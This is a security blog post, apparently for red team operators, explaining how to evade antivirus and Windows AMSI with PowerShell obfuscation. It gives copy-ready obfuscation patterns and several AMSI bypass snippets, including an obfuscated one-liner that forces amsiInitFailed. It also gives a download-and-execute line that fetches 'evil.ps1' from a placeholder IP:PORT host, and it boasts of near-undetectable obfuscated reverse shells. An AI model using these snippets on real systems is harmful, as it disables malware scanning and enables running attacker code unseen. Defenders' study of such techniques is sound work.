---
layout: post
author: D3Ext
title: AV Bypassing - Powershell Obfuscation
categories: [Powershell]
---

## Introduction

Hi there! In this post I am going to explain how we can bypass common AVs (antivirus) in different ways to help you during **Red Team Operations** and more. I recommend you to have a good base about powershell to understand basic syntax.

- Why I started researching on AV bypassing?

A few weeks ago I realised that I never was interested in bypassing **Windows Defender** so I started reading about it. I developed a script in **Ruby** that obfuscates Powershell syntax, then I tested it with the **Nishang** one-liner reverse shell and I got **2/60** detections on **VirusTotal**

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/obfuscation/virutstotal-nishang.png" alt="pic">

Lets start with the **AMSI**!

## What AMSI is?

In theory, **AMSI** stands for **"Windows Antimalware Scan Interface"** and provides enhanced malware protection for users. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.

But in practice, it can be easily bypassed so when you load malicious actions on memory them will not be analyzed and you can do whatever you want. It is important to emphasize that it only aplies if you load the scripts and commands in memory because it is the part which **AMSI** takes care of so if you disable it, you can run your malicious actions without problems.

## How do I bypass AVs?

Well, the best ways are using *Powershell Obfuscation* and *AMSI Bypass* because are faster and easier than using complex techniques in **C++** or **C#**

### Using Powershell Obfuscation

In this technique the main goal is to modify **Powershell** code and commands to avoid detections rules, we also should have in mind that if we only use one obfuscation method we may not get as good results as expected, so I suggest you to combine them.

Here are some differents examples:

- Split words and characters
```powershell
whoami
&("w"+"h"+"o"+"a"+"m"+"i")
```

- Downcase and upcase some characters
```
(Get-Location).Path
(GeT-loCAtIoN).pAtH
```

- Replace potentials AV triggers
```
IEX --> ("{1}{0}" -f 'EX','I')
New-Object --> (`G`C`M *w-O*)
Get-Command --> G`C`M
```

- Adding semi-random backticks (do not use them on lowercase characters)
```
Invoke-Expression --> `In`Vo`Ke-`Ex`Pr`Es`Si`On
New-Object --> `Ne`W-`Ob`Je`Ct
```

- Change variables names to random ones (do not change $true, $false, $null...)
```
$client --> $rjsaeuijaduargauyd
$output --> $dkamkuixfkxyosfi
```

- Define variables and sum them
```
whoami --> $var1="wh";$var2="oa";$var3="mi"; &("$var1$var2$var3")
```

- Delete/replace pentesting words
```
Nishang
Hack
PowerView
PowerSploit
Malware
Backdoor
...
```

- Remove all blank lines and comment lines

- Try to change IP to decimal or any other format
```
192.168.1.1 --> 3232235777
```

- Being creative and using common sense

- Use different encoding formats, like **base64** or **hex**

> Using base64 (with more obfuscation)
```powershell
&("{1}{0}"-f"x","iE")([SyStEm.TeXt.EnCoDiNg]::uNiCoDe.GetString([sYsTeM.cOnVeRt]::("{2}{0}{1}"-f"aSe64StRiNg","","fRoMb")('dwBoAG8AYQBtAGkA')))
```

> Using hexadecimal data (example with "whoami")
```powershell
&("{1}{0}"-f"eX","I")(("77 68 6F 61 6D 69" -sPlIt ' ' |FoReAcH-ObJeCt {[char][byte]"0x$_"}) -jOiN '')
```

### AMSI Bypass

As I said before, this trick is done in memory so our malicious actions are not analyzed. To check if the AMSI has been bypassed we can execute "**AmsiUtils**" in our terminal, if the command gives error and it is flagged as a virus, it means that it is active.

There are multiple techniques to achieve the bypass:

- Patch Method

It is a powershell scripts that locates **AmsiScanBuffer** memory address to write on it certain values and make it always return **False** like if it didn't found malware

[Here](https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4#file-amsi-patch-ps1) you can find the script

- Memory Hijacking

As the patch method, it hooks the **AmsiScanBuffer** function to make it never detect malware

[Here](https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4#file-memory-hijacking-ps1) here you have the script

- Forcing an error

The function **amsiInitFailed()** always exit when it is assigned with a Boolen value, so the **AMSI** never starts working

Just execute this:

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

- Powershell downgrading

This one is really trivial, you just need to use an older powershell version like **2.0** so AMSI do not scan memory, you can do this by executing:

```powershell
powershell -version 2.0
```

Personally I do not recommend this technique because a lot of scripts and functions do not support Powershell 2.0 version

- One-liner

My favourite and probably the best choice is a simple one-liner with a lot of obfuscation to avoid beeing detected by the same **AMSI**, just execute this:

```powershell
[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
```

**If any of the methods is detected by the AV you could try to obfuscate the script or code with the mentioned tricks about powershell obfuscation**

### How can this help us to bypass AVs?

If we put all this information and techniques together we can use the desired method to bypass AMSI (in this case we will use the one-liner) and then we load in memory the script we want to import using the classic IEX command

```powershell
IEX(New-Object Net.WebClient).downloadString("http://IP:PORT/evil.ps1")
```

If we execute that once we have bypassed/deactivated the AMSI, it will not be flagged by the Defender, here you have a *POC*

## Demo

This video shows you how I was able to load and execute in memory **PowerUp.ps1** from **PowerShell Mafia** in a Windows machine with the AV up to date.

<video src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/obfuscation/bypassing-demo.mp4"></video>

## Tools

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) by *Daniel Bohannon*

[Chimera](https://github.com/tokyoneon/Chimera) by *TokyoNeon*

## References

```
https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-series-chapter-1-intro/
https://www.danielbohannon.com/blog-1/tag/Obfuscation
https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science.pdf
https://helloitsliam.com/2018/03/21/obfuscating-powershell-commands/ https://medium.com/@SecureTacticsTS/simple-but-effective-powershell-obfuscation-techniques-b38900d8f7dd
https://www.varonis.com/blog/powershell-obfuscation-stealth-confusion-part-ii
```

## Conclusion

As you can see it is really easy to bypass **Windows Defender** and common AV alternatives, if you want to see more about this theme I suggest you to take a look at the **CRTO** cert (Certified Red Team Operator) created by **RastaMouse**, an expert in Red Team, AV bypassing, C++ and more stuff related to Windows.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/obfuscation/crto.png" alt="pic" width=260 height=250>

Apart from that I also recommend you the **Sektor7 Red Team Operator** course which costs 200$ and teachs really useful stuff like Process Injections and more



